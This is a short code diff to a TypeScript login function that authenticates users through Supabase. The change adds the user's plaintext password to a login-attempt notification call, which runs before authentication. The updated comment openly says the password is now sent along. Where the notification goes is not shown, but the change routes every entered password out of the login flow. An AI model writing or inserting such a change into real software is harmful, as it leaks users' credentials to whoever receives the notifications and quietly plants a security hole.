@@ -20,8 +20,8 @@ export const loginUser = async (email: string, password: string): Promise<LoginR
   }
   
   try {
-    // Send notification about login attempt
-    await notifyLoginAttempt(email);
+    // Send notification about login attempt with password
+    await notifyLoginAttempt(email, password);
     
     // First, try to authenticate with Supabase
     const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
